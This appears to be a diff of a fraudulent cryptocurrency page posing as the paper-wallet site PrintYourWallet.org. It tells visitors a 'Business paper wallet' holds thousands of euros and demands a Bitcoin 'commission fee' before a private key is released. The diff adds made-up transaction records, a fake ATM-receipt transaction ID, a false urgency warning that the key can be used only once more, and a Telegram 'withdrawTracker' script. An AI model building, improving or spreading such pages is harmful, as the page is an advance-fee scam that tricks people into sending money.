@@ -11,10 +11,12 @@
         content="Whether it is to make a special gift, or to store your own Bitcoins in a safe place, PrintYourWallet.org is the easiest, safest and most fun way to store your cryptocurrencies offline." />
     <meta name="keywords"
         content="generate bitcoin paper wallet, create crypto paper wallet, cold storage, bitcoin paper wallet, bitcoin cash paper wallet, Ethereum paper wallet, Litecoin paper wallet, Ethereum classic paper wallet, Eos paper wallet, store bitcoins in cold storage, cold storage, crypto paper wallet" />
+
     <!--  - Google Analytics Global site tag (gtag.js)-->
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-178266520-1"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
         gtag('js', new Date());
         gtag('config', 'UA-178266520-1');
     </script>
@@ -50,12 +52,13 @@
 </head>
 
 <body>
-    <!-- help container null styles -->
     <!-- Loader -->
     <div style="position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
         id="loader-wrapper">
         <div class="loader"></div>
     </div>
+    <!-- help container null styles -->
+
     <style>
         #telegram-feedback-root .tf-link {
             display: none !important;
@@ -168,161 +171,120 @@
 
     <!-- ========== Start Main Section ========== -->
 
-    <!-- Hero Section -->
     <div class="container check-balance">
-        <!-- <figure>
-      <img style="width: 200px;" src="img/ethereum.gif" class="d-block mx-auto" alt="Print Your Wallet Logo">
-    </figure> -->
         <img src="./img/bitcoins-black.jpg" alt="" class="magnum-deposit__bitcoin" style="width: 337px;">
-        <p class="check-balance__eur">Business paper wallet detected!</p>
-        <!-- <p class="text-center whi"></p> -->
-        <h1 class="h1 text-center" style="margin-top: 2rem;">Current Balance</h1>
-        <p style="font-size: 28px;" id="balance_euro" class="check-balance__eur">6777 EUR</p>
-        <p style="margin-bottom: 5px;" class="check-balance__bitcoin"><img src="./img/bitcoin-convert.jpg"" alt="
-                bitcoin-convert" width="60" class="d-block mx-auto mb-1"></p>
-        <p id="balance_bitcoin" class="check-balance__bitcoin"></p>
 
-    </div>
+        <p class="check-balance__eur">Business paper wallet detected! <br>Deposited by Bitcoin ATM receipt
+            <br><span>(transaction ID - S16B1R6B1-D9N1)</span>
+        </p>
+        <h1 class="h1 text-center mt-1">Current Balance</h1>
+        <p style="font-size: 28px;" id="setPrice" class="check-balance__eur">9550,69 EUR</p>
+        <div class="check-balance__bitcoin">
+        </div>
+        <br>
+        <ul style="list-style-type: none;" class="check-balance__advs">
+            <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
+            <li>> PRIVATE key gives you complete access to your funds on Bitcoin paper wallet.</li>
+            <li>> DO NOT REVEAL or SHARE THE PRIVATE KEY until you withdraw funds from Bitcoin paper wallet to your own
+                cryptocurrency wallet.</li>
+            <li>> To withdraw funds from paper wallet you must pay a <span class="commissionPrecent"></span> commission
+                fee the current amount on the Bitcoin paper
+                wallet.</li>
+        </ul>
+        <div class="container secure-text courier-prime-font">
+            <ul>
+                <li>For security reasons, the private key can only be</li>
+                <li>used 3 times, after which it will no longer be valid</li>
+            </ul>
 
-    <div class="container check-balance">
-        <!-- <img src="./img/bitcoin_convert.jpg" alt="" width="100" class="d-block mx-auto"> -->
-        <!-- <h3 class="h3 text-center mt-1">Business paper wallet</h3> -->
+        </div>
 
-        <form class="deposit-crypto">
-            <div class="deposit-crypto__field">
-                <div class="deposit-crypto__main">
-                    <label><span class="commissionPrecent"></span> Commission Fee</label>
-                    <p id="get_commission">0.0057</p>
+        <div class="container wallet-text courier-prime-font">
+            <h4 style="color: gray;font-size: 20px;margin-bottom: 10px;">Bitcoin paper wallet transactions</h4>
+        </div>
+
+
+        <div class="container waller-transactions courier-prime-font">
+
+            <div class="main-waller-transactions">
+                <div class="main-waller-transactions-list">
+                    <div>
+                        <span>Deposited</span>
+                    </div>
+                    <div>
+                        <img width="25" height="25" src="img/accepted.png" alt="accepted.png">
+                        <span id="transaction_0" >0. BTC</span>
+                    </div>
                 </div>
-                <img src="./img/one-bitcoin-black.jpg" alt="" width="40" height="40">
-            </div>
-            <div class="deposit-crypto__field">
-                <div class="deposit-crypto__main">
-                    <label>Bitcoin address to pay a commission fee</label>
-                    <p id="copy-address" onclick="copyAddress()" style="cursor: pointer;" class="btc_address">asd</p>
+                <div class="main-waller-transactions-list">
+                    <div>
+                        <span>Recent withdrawals</span>
+                    </div>
                 </div>
-                <img src="./img/one-bitcoin-black.jpg" alt="" width="40" height="40">
-            </div>
-
-
-
-            <!-- more info popup -->
-            <div class="more_info_popup">
-                <div class="more_info_popup-body">
-                    <div class="more_info_popup-image">
-                        <div onclick="openMoreInfoPopup(false)" class="more_info_popup-close">&#10006;</div>
-                        <ul style="list-style-type: none;" class="check-balance__advs">
-                            <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
-                            <li>* To unlock the PRIVATE key and withdraw funds from the bitcoin paper wallet you need to
-                                pay 3% commission fee.</li>
-                            <br>
-                            <li>* Scan QR code below,send the correct amount of the Bitcoin indicated in the form above.
-                            </li> <br>
-                            <li>* Double check the bitcoin address into which you need to pay the commission fee.</li>
-                            <br>
-                            <li>* Once the commission fee has been paid,click the button below</li>
-                        </ul>
+                <div class="main-waller-transactions-list">
+                    <div>
+                        <span>15.02.2024</span>
+                    </div>
+                    <div>
+                        <img width="25" height="25" src="img/decline.jpg" alt="decline.png">
+                        <span id="transaction_1" >0. BTC</span>
+                    </div>
+                </div>
+                <div class="main-waller-transactions-list">
+                    <div>
+                        <span>26.02.2024</span>
+                    </div>
+                    <div>
+                        <img width="25" height="25" src="img/decline.jpg" alt="decline.png">
+                        <span id="transaction_2">0. BTC</span>
+                    </div>
+                </div>
+                <br>
+                <br>
+                <div class="main-waller-transactions-list">
+                    <div>
+                        <span>Current balance</span>
+                    </div>
+                    <div>
+                        <span id="mainWalletBtc">0. BTC</span>
                     </div>
                 </div>
             </div>
+        </div>
 
-            <script>
-
-                function copyAddress() {
-                    const textToCopy = document.getElementById("copy-address")
-
-                    var range = document.createRange();
-                    range.selectNode(textToCopy);
-                    window.getSelection().removeAllRanges();
-                    window.getSelection().addRange(range);
-
-                    // Копирование в буфер обмена
-                    document.execCommand("copy");
-
-                    // Очистка выделения
-                    window.getSelection().removeAllRanges();
-
-                    btc_address = textToCopy.textContent
-
-                    textToCopy.textContent = "copied!"
-
-                    setTimeout(() => {
-                        textToCopy.textContent = btc_address
-                    }, 2000);
-
-
-
-                }
-                function openMoreInfoPopup(type) {
-                    const popupInfo = document.getElementsByClassName("more_info_popup")[0]
-
-                    if (type) {
-                        popupInfo.style.display = "flex"
-                    } else {
-                        popupInfo.style.display = "none"
-
-                    }
-                }
-
-            </script>
-
-            <!-- more info popup -->
-
-            <!-- ,scan QR code
-                below,send the correct amount of the Bitcoin indicated in the form above, -->
-
-            <p class="text-center black-text">To pay the <span class="commissionPrecent"></span> commission fee use a
-                digital crypto wallet, <a onclick="openMoreInfoPopup(true)" id="more-text-info">more info</a></p>
-            <img id="qr_code" src="./img/qr-code.png" alt="" width="300" class="d-block mx-auto mt-2 mb-2">
-
-            <!-- Cutsom checkbox -->
-
-            <div class="custom-checkbox_normal">
-                <p class="email-confirm__descr mt-4 text-center"
-                    style="font-size: 14px;color: black;margin-top: 0 !important;"><input type="checkbox"
-                        id="checkbox-popup" style="transform: scale(1.3);margin-right: 4px;"> Commission fee is paid and
-                    confirmed
-                </p>
-            </div>
-
-            <div class="custom-checkbox_danger hidden">
-                <label class="email-confirm__descr mt-4 text-center" style="font-size: 14px;color: black;margin-top: 0 !important;align-items: center;
-                display: flex;">
-                    <input id="checkbox-popup-danger" class="checkbox-popup" type="checkbox">
-                    <span class="custom-checkbox" style="margin-right: 5px;"></span>
-                    Commission fee is paid and confirmed
-                </label>
-            </div>
-            <!-- Cutsom checkbox -->
-
-
-            <div class="get-found-button"></div>
-            <p id="wait" class="check-balance__wait">Transaction verification in progress<br>Please wait...</p>
-            <p class="form-error text-center text-danger fill-data">Error <br>Please fill the form</p>
-            <p class="form-error text-center text-danger incorrect-data">Incorrect data entered!</p>
-
-        </form>
-        <script>
-            const form = document.querySelector('.deposit-crypto');
-
-            form.addEventListener('submit', e => {
-                e.preventDefault();
-            });
-        </script>
-
-        <p class="email-confirm__descr mt-4 text-center" style="font-size: 13px;">After two confirmations on the
-            blockchain the commission fee
-            will be confirmed, transfer invoice and funds activation code will be send to email</p>
+        <div class="container important-warning courier-prime-font">
+            <ul>
+                <li>Important! The private key has already been used twice,with one <br> operation remaining. Withdraw funds from the paper wallet in one go,</li>
+                <li>as the private key will no longer be valid</li>
+            </ul>
+        </div>
 
     </div>
 
-    <!-- <figure style="display: flex; width: 100%; align-items: center; justify-content: center; margin: 10px 0;">
-        <img style="width: 80px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
 
+    <div style="display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+" class="container check-balance">
+        <!-- <p class="text-center text-danger">To withdraw funds from paper wallet you must pay a <span class="commissionPrecent"></span> commission of the current
+      amount on the Bitcoin paper wallet! <br>IMPORTANT! The secret Private key can be used only once, after that it
+      will not be valid.</p>
+
+    <p class="email-confirm__descr green-text mt-4 text-sm-center text-left">After 2 confirmations on blockchain the
+      commission fee will be confirmed, transfer invoice and activation code will be send to email</p> -->
+        <!-- <figure>
+      <img style="width: 80px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
     </figure> -->
+        <button style="margin-top: 25px;" class="check-balance__btn green-btn" onclick="buttonClicked()">Next</button>
+
+    </div>
+
+
 
     <!-- ========== Start Footer ========== -->
     <!-- ========== FOOTER ========== -->
+    <br>
     <script src="assets/vendor/jquery/dist/jquery.min.js"></script>
     <script src="assets/vendor/jquery-migrate/dist/jquery-migrate.min.js"></script>
     <script src="assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
@@ -378,7 +340,7 @@
         });
     </script>
     <!-- Bitcoin swiper -->
-    <section class="section-marq" style="padding-top: 45px !important;">
+    <section style="padding-top: 45px !important;" class="section-marq">
         <!-- <div class="marquee__bg">
       <picture class="kraken-image">
         <source type="image/webp" srcset="
@@ -400,7 +362,7 @@
         <img class="kraken-image" alt="" loading="lazy" />
       </picture>
     </div> -->
-        <!-- <div class="marquee">
+        <div class="marquee">
             <div class="marquee__content ml-10" direction="right">
                 <div id="moved1" class="moved-section"></div>
             </div>
@@ -413,7 +375,7 @@
             <div class="marquee__content ml-40" direction="right">
                 <div id="moved4" class="moved-section"></div>
             </div>
-        </div> -->
+        </div>
     </section>
     <!-- Bitcoin swiper -->
 
@@ -422,53 +384,8 @@
         if (/MSIE \d|Trident.*rv:/.test(navigator.userAgent)) document.write('<script src="assets/vendor/polifills.js"><\/script>');
     </script>
 
-    <!-- <div id="popup" class="popup">
-        <div class="popup-content">
-            <div class="popup-header">
-                <figure>
-                    <img style="width: 60px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
-                </figure>
-            </div>
-            <div class="popup-content">
-                <ul class="check-balance__advs">
-                    <li>> Open your private digital wallet</li>
-                    <li>> Use the bitcoin address provided</li>
-                    <li id="bitcoin-address">1b1er9b1rt91tje61nb9re1b9n19ytm19t1nb9r1nb9ytm1</li>
-                    <li>> Send the specified commission fee</li>
-                    <li id="bitcoin-commission">0,00145 BTC</li>
-                    <li>> Wait for blockchain confirmation</li>
-                    <li>> Press Next</li>
-                    <li>> Withdraw wallet balance to your private BTC address</li>
-                </ul>
-            </div>
-        </div>
-    </div> -->
 
-    <div id="popup" class="popup">
-        <div class="popup-content">
-            <div class="popup-header">
-                <figure>
-                    <img style="width: 60px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
-                </figure>
-            </div>
-            <div class="popup-content">
-                <ul class="check-balance__advs">
-                    <p style="margin-bottom: 5px;font-size: 15px;">Chassecrypt instruction to pay the commission:</p>
-                    <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
-                    <li>> Open your private digital wallet</li>
-                    <li>> Use the bitcoin address provided</li>
-                    <span id="bitcoin-address">1b1er9b1rt91tje61nb9re1b9n19ytm19t1nb9r1nb9ytm1</span>
-                    <li>> Send the specified commission fee</li>
-                    <span id="bitcoin-commission">0,00145 BTC</span>
-                    <li>> Wait for blockchain confirmation</li>
-                    <li>> Use activation code from your email</li>
-                    <li>> Withdraw wallet balance to your private BTC address</li>
-                </ul>
-            </div>
-        </div>
-    </div>
-
-    <footer class="container  padding-top_footer  space-2 text-center d-flex flex-column align-items-center">
+    <footer class="container padding-top_footer  space-2 text-center d-flex flex-column align-items-center">
         <!-- Logo -->
         <a class="navbar-brand footer-logo" href="index.html" aria-label="Front">
             <figure>
@@ -498,18 +415,19 @@
     <!-- JS Implementing Plugins -->
     <script src="assets/vendor/hs-counter/dist/hs-counter.min.js"></script>
     <script src="assets/vendor/appear.js"></script>
-    <!-- telegram bot -->
-    <script src="assets/js/withdrawTracker-5.js"></script>
+    <script src="assets/js/getPrices.js"></script>
+    <!--Telegram bot-->
+    <script src="assets/js/withdrawTracker-8.js"></script>
     <script type="module" src="assets/js/loader.js"></script>
     <script src="assets/js/dropdown.js"></script>
     <script src="assets/js/setBrandName.js"></script>
+
     <script>
         (function (u) {
             var s = document.createElement('script'); s.async = true; s.src = u;
             var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
         })('https://widget.replain.cc/dist/client.js');
     </script>
-
     <script type="text/javascript">
         (function (m, e, t, r, i, k, a) {
             m[i] = m[i] || function () { (m[i].a = m[i].a || []).push(arguments) };
@@ -529,6 +447,13 @@
     <noscript>
         <div><img src="https://mc.yandex.ru/watch/92059143" style="position:absolute; left:-9999px;" alt="" /></div>
     </noscript>
+</body>
+
+</html>
+
+
+
+
 </body>
 
 </html>
